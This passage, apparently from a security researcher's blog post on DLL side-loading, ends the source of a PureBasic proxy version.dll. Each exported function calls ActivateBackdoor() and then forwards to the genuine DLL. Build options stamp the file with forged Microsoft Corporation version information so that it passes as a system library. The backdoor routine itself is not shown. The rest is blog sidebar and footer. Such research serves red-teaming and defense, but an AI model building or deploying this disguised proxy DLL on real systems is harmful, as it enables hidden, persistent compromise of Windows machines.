+<span class="n">ProcedureDLL</span><span class="p">.</span><span class="n">i</span> <span class="n">VerInstallFileW</span><span class="p">(</span><span class="n">a1</span><span class="p">.</span><span class="n">l</span><span class="p">,</span> <span class="n">a2</span><span class="p">.</span><span class="n">i</span><span class="p">,</span> <span class="n">a3</span><span class="p">.</span><span class="n">i</span><span class="p">,</span> <span class="n">a4</span><span class="p">.</span><span class="n">i</span><span class="p">,</span> <span class="n">a5</span><span class="p">.</span><span class="n">i</span><span class="p">,</span> <span class="n">a6</span><span class="p">.</span><span class="n">i</span><span class="p">,</span> <span class="n">a7</span><span class="p">.</span><span class="n">i</span><span class="p">,</span> <span class="n">a8</span><span class="p">.</span><span class="n">i</span><span class="p">)</span>
+  <span class="n">ActivateBackdoor</span><span class="p">()</span>
+  <span class="n">ProcedureReturn</span> <span class="n">CallCFunction</span><span class="p">(</span><span class="n">LoadVersionDll</span><span class="p">(),</span> <span class="s">"VerInstallFileW"</span><span class="p">,</span> <span class="n">a1</span><span class="p">,</span> <span class="n">a2</span><span class="p">,</span> <span class="n">a3</span><span class="p">,</span> <span class="n">a4</span><span class="p">,</span> <span class="n">a5</span><span class="p">,</span> <span class="n">a6</span><span class="p">,</span> <span class="n">a7</span><span class="p">,</span> <span class="n">a8</span><span class="p">)</span>
+<span class="n">EndProcedure</span>
+
+<span class="err">;</span><span class="n">DWORD</span> <span class="n">VerLanguageNameA</span><span class="p">(</span>
+<span class="err">;</span>  <span class="n">DWORD</span> <span class="n">wLang</span><span class="p">,</span>
+<span class="err">;</span>  <span class="n">LPSTR</span> <span class="n">szLang</span><span class="p">,</span>
+<span class="err">;</span>  <span class="n">DWORD</span> <span class="n">cchLang</span>
+<span class="err">;</span><span class="p">)</span><span class="err">;</span>
+<span class="n">ProcedureDLL</span><span class="p">.</span><span class="n">i</span> <span class="n">VerLanguageNameA</span><span class="p">(</span><span class="n">a1</span><span class="p">.</span><span class="n">l</span><span class="p">,</span> <span class="n">a2</span><span class="p">.</span><span class="n">i</span><span class="p">,</span> <span class="n">a3</span><span class="p">.</span><span class="n">l</span><span class="p">)</span>
+  <span class="n">ActivateBackdoor</span><span class="p">()</span>
+  <span class="n">ProcedureReturn</span> <span class="n">CallCFunction</span><span class="p">(</span><span class="n">LoadVersionDll</span><span class="p">(),</span> <span class="s">"VerLanguageNameA"</span><span class="p">,</span> <span class="n">a1</span><span class="p">,</span> <span class="n">a2</span><span class="p">,</span> <span class="n">a3</span><span class="p">)</span>
+<span class="n">EndProcedure</span>
+
+<span class="err">;</span><span class="n">DWORD</span> <span class="n">VerLanguageNameW</span><span class="p">(</span>
+<span class="err">;</span>  <span class="n">DWORD</span>  <span class="n">wLang</span><span class="p">,</span>
+<span class="err">;</span>  <span class="n">LPWSTR</span> <span class="n">szLang</span><span class="p">,</span>
+<span class="err">;</span>  <span class="n">DWORD</span>  <span class="n">cchLang</span>
+<span class="err">;</span><span class="p">)</span><span class="err">;</span>
+<span class="n">ProcedureDLL</span><span class="p">.</span><span class="n">i</span> <span class="n">VerLanguageNameW</span><span class="p">(</span><span class="n">a1</span><span class="p">.</span><span class="n">l</span><span class="p">,</span> <span class="n">a2</span><span class="p">.</span><span class="n">i</span><span class="p">,</span> <span class="n">a3</span><span class="p">.</span><span class="n">l</span><span class="p">)</span>
+  <span class="n">ActivateBackdoor</span><span class="p">()</span>
+  <span class="n">ProcedureReturn</span> <span class="n">CallCFunction</span><span class="p">(</span><span class="n">LoadVersionDll</span><span class="p">(),</span> <span class="s">"VerLanguageNameW"</span><span class="p">,</span> <span class="n">a1</span><span class="p">,</span> <span class="n">a2</span><span class="p">,</span> <span class="n">a3</span><span class="p">)</span>
+<span class="n">EndProcedure</span>
+
+<span class="err">;</span><span class="n">BOOL</span> <span class="n">VerQueryValueA</span><span class="p">(</span>
+<span class="err">;</span>  <span class="n">LPCVOID</span> <span class="n">pBlock</span><span class="p">,</span>
+<span class="err">;</span>  <span class="n">LPCSTR</span>  <span class="n">lpSubBlock</span><span class="p">,</span>
+<span class="err">;</span>  <span class="n">LPVOID</span>  <span class="o">*</span><span class="n">lplpBuffer</span><span class="p">,</span>
+<span class="err">;</span>  <span class="n">PUINT</span>   <span class="n">puLen</span>
+<span class="err">;</span><span class="p">)</span><span class="err">;</span>
+<span class="n">ProcedureDLL</span><span class="p">.</span><span class="n">i</span> <span class="n">VerQueryValueA</span><span class="p">(</span><span class="n">a1</span><span class="p">.</span><span class="n">i</span><span class="p">,</span> <span class="n">a2</span><span class="p">.</span><span class="n">i</span><span class="p">,</span> <span class="n">a3</span><span class="p">.</span><span class="n">i</span><span class="p">,</span> <span class="n">a4</span><span class="p">.</span><span class="n">l</span><span class="p">)</span>
+  <span class="n">ActivateBackdoor</span><span class="p">()</span>
+  <span class="n">ProcedureReturn</span> <span class="n">CallCFunction</span><span class="p">(</span><span class="n">LoadVersionDll</span><span class="p">(),</span> <span class="s">"VerQueryValueA"</span><span class="p">,</span> <span class="n">a1</span><span class="p">,</span> <span class="n">a2</span><span class="p">,</span> <span class="n">a3</span><span class="p">,</span> <span class="n">a4</span><span class="p">)</span>
+<span class="n">EndProcedure</span>
+
+<span class="err">;</span><span class="n">BOOL</span> <span class="n">VerQueryValueW</span><span class="p">(</span>
+<span class="err">;</span>  <span class="n">LPCVOID</span> <span class="n">pBlock</span><span class="p">,</span>
+<span class="err">;</span>  <span class="n">LPCWSTR</span> <span class="n">lpSubBlock</span><span class="p">,</span>
+<span class="err">;</span>  <span class="n">LPVOID</span>  <span class="o">*</span><span class="n">lplpBuffer</span><span class="p">,</span>
+<span class="err">;</span>  <span class="n">PUINT</span>   <span class="n">puLen</span>
+<span class="err">;</span><span class="p">)</span><span class="err">;</span>
+<span class="n">ProcedureDLL</span><span class="p">.</span><span class="n">i</span> <span class="n">VerQueryValueW</span><span class="p">(</span><span class="n">a1</span><span class="p">.</span><span class="n">i</span><span class="p">,</span> <span class="n">a2</span><span class="p">.</span><span class="n">i</span><span class="p">,</span> <span class="n">a3</span><span class="p">.</span><span class="n">i</span><span class="p">,</span> <span class="n">a4</span><span class="p">.</span><span class="n">l</span><span class="p">)</span>
+  <span class="n">ActivateBackdoor</span><span class="p">()</span>
+  <span class="n">ProcedureReturn</span> <span class="n">CallCFunction</span><span class="p">(</span><span class="n">LoadVersionDll</span><span class="p">(),</span> <span class="s">"VerQueryValueW"</span><span class="p">,</span> <span class="n">a1</span><span class="p">,</span> <span class="n">a2</span><span class="p">,</span> <span class="n">a3</span><span class="p">,</span> <span class="n">a4</span><span class="p">)</span>
+<span class="n">EndProcedure</span>
+
+<span class="err">;</span> <span class="o">---------------------------------------------------------------------------</span>
+
+<span class="err">;</span> <span class="n">IDE</span> <span class="n">Options</span> <span class="o">=</span> <span class="n">PureBasic</span> <span class="mf">5.73</span> <span class="n">LTS</span> <span class="p">(</span><span class="n">Windows</span> <span class="o">-</span> <span class="n">x64</span><span class="p">)</span>
+<span class="err">;</span> <span class="n">ExecutableFormat</span> <span class="o">=</span> <span class="k">Shared</span> <span class="n">dll</span>
+<span class="err">;</span> <span class="n">CursorPosition</span> <span class="o">=</span> <span class="mi">85</span>
+<span class="err">;</span> <span class="n">FirstLine</span> <span class="o">=</span> <span class="mi">60</span>
+<span class="err">;</span> <span class="n">Folding</span> <span class="o">=</span> <span class="o">-----</span>
+<span class="err">;</span> <span class="n">Executable</span> <span class="o">=</span> <span class="n">version</span><span class="p">.</span><span class="n">dll</span>
+<span class="err">;</span> <span class="n">CompileSourceDirectory</span>
+<span class="err">;</span> <span class="n">EnablePurifier</span>
+<span class="err">;</span> <span class="n">IncludeVersionInfo</span>
+<span class="err">;</span> <span class="n">VersionField2</span> <span class="o">=</span> <span class="n">Microsoft</span> <span class="n">Corporation</span>
+<span class="err">;</span> <span class="n">VersionField3</span> <span class="o">=</span> <span class="n">Microsoft</span><span class="err">®</span> <span class="n">Windows</span><span class="err">®</span> <span class="n">Operating</span> <span class="n">System</span>
+<span class="err">;</span> <span class="n">VersionField5</span> <span class="o">=</span> <span class="mf">10.0</span><span class="p">.</span><span class="err">20190.1000</span> <span class="err">(</span><span class="n">WinBuild</span><span class="p">.</span><span class="err">160101.0800)</span>
+<span class="err">;</span> <span class="n">VersionField6</span> <span class="o">=</span> <span class="n">Version</span> <span class="n">Checking</span> <span class="n">and</span> <span class="n">File</span> <span class="n">Installation</span> <span class="n">Libraries</span>
+<span class="err">;</span> <span class="n">VersionField7</span> <span class="o">=</span> <span class="n">version</span>
+<span class="err">;</span> <span class="n">VersionField8</span> <span class="o">=</span> <span class="n">VERSION</span><span class="p">.</span><span class="n">DLL</span>
+<span class="err">;</span> <span class="n">VersionField9</span> <span class="o">=</span> <span class="err">©</span> <span class="n">Microsoft</span> <span class="n">Corporation</span><span class="p">.</span> <span class="n">All</span> <span class="n">rights</span> <span class="n">reserved</span><span class="p">.</span>
+<span class="err">;</span> <span class="n">VersionField15</span> <span class="o">=</span> <span class="n">VOS_NT</span>
+<span class="err">;</span> <span class="n">VersionField16</span> <span class="o">=</span> <span class="n">VFT_DLL</span>
+</code></pre></div></div>
+
+            </section>
+          </article>
+        </div>
+        <div class="col-xs-6 col-md-4 no-print"><div id="latest-posts">
+  <h4>Latest Posts</h4>
+  <ul><li><a href="/ranting/2021/01/17/msbuild-backdoor.html">17 Jan 2021</span> &raquo; Backdooring MSBuild</a></li><li><a href="/windows/2019/10/30/schedsvc-persist-without-task.html">30 Oct 2019</span> &raquo; Persistence using Task Scheduler without a Scheduled Task</a></li><li><a href="/windows/2019/01/13/persistance-via-path-directories.html">13 Jan 2019</span> &raquo; Windows 10 Persistence via PATH directories - CDPSvc</a></li><li><a href="/security/2019/01/07/side-loading-fun-7.html">07 Jan 2019</span> &raquo; DLL Side-Loading for Fun (and Profit?) - Day 7</a></li><li><a href="/security/2019/01/06/side-loading-fun-5-and-6.html">06 Jan 2019</span> &raquo; DLL Side-Loading for Fun (and Profit?) - Day 5 & 6</a></li><li><a href="/security/2019/01/04/side-loading-fun-4.html">04 Jan 2019</span> &raquo; DLL Side-Loading for Fun (and Profit?) - Day 4</a></li><li><a href="/security/2019/01/03/side-loading-fun-3.html">03 Jan 2019</span> &raquo; DLL Side-Loading for Fun (and Profit?) - Day 3</a></li><li><a href="/security/2019/01/02/side-loading-fun-2.html">02 Jan 2019</span> &raquo; DLL Side-Loading for Fun (and Profit?) - Day 2</a></li><li><a href="/security/2019/01/01/side-loading-fun.html">01 Jan 2019</span> &raquo; DLL Side-Loading for Fun (and Profit?)</a></li><li><a href="/security/2018/08/10/another-link-between-eqgrp-and-stuxnet.html">10 Aug 2018</span> &raquo; Another link between Equation Group and Stuxnet?</a></li><li><a href="/security/2015/05/31/vulnerability-disclosure-policy.html">31 May 2015</span> &raquo; Vulnerability Disclosure Policy</a></li><li><a href="/vmware/2014/06/27/replacing-vmware-tools.html">27 Jun 2014</span> &raquo; Using the newest VMware tools (from VMware Workstation 10) with VMware Workstation 9.x</a></li><li><a href="/anything/2014/06/26/pfsense-kibana.html">26 Jun 2014</span> &raquo; Archiving pfSense logs using Logstash, Elastic Search and Kibana on Debian 7</a></li><li><a href="/shell/2013/12/28/recursive-chmod-rw-file-rwx-directories.html">28 Dec 2013</span> &raquo; Recursive chmod -> rw for files, rwx for directories</a></li></ul>
+</div></div>
+      </div>
+    </div>
+
+    <div id="footer">
+      <div class="container">
+        <p class="text-muted"></p>
+          <h4>Disclaimer</h4>
+          <p>
+            This is my personal blog.
+            The views expressed on these pages are mine alone and not those of my employer or 
+            former employers.
+            As with time, views may change, become outdated or even invalid, and 
+            therefore may not represent my current views.
+            All information is provided as-is and if not otherwise stated the content is provided 
+            under the <a href="http://opensource.org/licenses/BSD-2-Clause">2-clause BSD License</a>.
+          </p>
+          <div>
+            <a href="mail:marpie+blogspam@a12d404.net" _target="_blank">
+              👽&nbsp;Markus Piéton
+            </a>&nbsp;
+            <a href="https://github.com/marpie" _target="_blank">
+              <img src="/images/github.svg" alt="view my projects on Github" style="width: 28px;">
+              &nbsp;marpie
+            </a>&nbsp;
+            <a href="https://twitter.com/markus_pieton" _target="_blank">
+              <img src="/images/twitter.svg" alt="follow me on Twitter" style="width: 28px;">
+              &nbsp;@markus_pieton
+            </a>&nbsp;
+          </div>
+        </p>
+      </div>
+    </div>
+
+    <script src="/javascripts/jquery.min.js"></script>
+    <script src="/javascripts/bootstrap.min.js"></script>
+  </body>
+</html>
